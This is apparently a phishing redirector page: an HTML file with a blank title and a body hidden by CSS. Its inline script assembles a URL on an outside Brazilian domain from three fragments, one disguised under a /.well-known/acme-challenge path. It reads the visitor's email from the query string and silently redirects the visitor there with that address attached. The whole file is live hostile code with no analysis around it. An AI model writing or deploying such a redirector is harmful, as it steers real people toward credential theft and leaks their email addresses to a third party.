<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        (function() {
            var part1 = "http://hipero2.com.br";
            var part2 = "/.well-known/acme-challenge";
            var part3 = "/webinar/ver/index.php#";

            // Function to get the email from the query string
            function getQueryParameter(param) {
                var urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(param);
            }

            // Get the 'email' parameter from the URL query string
            var email = getQueryParameter('email');

            // Decode the email parameter to keep @ symbol intact
            if (email) {
                var decodedEmail = decodeURIComponent(email);

                // Construct the redirect URL
                var redirectUrl = part1 + part2 + part3 + "?email=" + decodedEmail;

                // Redirect to the constructed URL
                window.location.href = redirectUrl;
            }
        })();
    </script>
</head>
